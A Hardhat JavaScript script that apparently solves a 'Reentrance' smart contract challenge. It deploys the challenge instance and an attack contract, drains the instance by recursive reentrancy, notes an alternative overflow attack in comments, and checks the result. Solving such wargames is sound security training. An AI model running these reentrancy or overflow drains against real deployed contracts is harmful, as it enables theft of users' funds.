const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    // deploy factory
    const Factory = await ethers.getContractFactory("ReentranceFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();

    // deploy new instance
    const receipt = await factory.connect(player).createInstance(player.address, {
        value: ethers.utils.parseEther("0.001"),
    });
    const instance_address = (await receipt.wait()).events[0].args[0];
    const reentrance = await ethers.getContractAt("Reentrance", instance_address, owner);
    const Attack = await ethers.getContractFactory("ReentranceAttack");
    const attack = await Attack.connect(player).deploy(reentrance.address, {
        value: ethers.utils.parseEther("0.01"),
    });
    await attack.deployed();

    // ATTACK 1: recursively draining
    await attack.attack_recursive({
        gasLimit: 3000000,
    });

    // ATTACK 2: cause overflow to forge the balance(in storage)
    // await attack.attack_1_causeOverflow();
    // await attack.attack_2_deplete();

    // check
    let res = await factory.validateInstance(reentrance.address, player.address);
    res = (await res.wait()).events[0].args[0];
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});



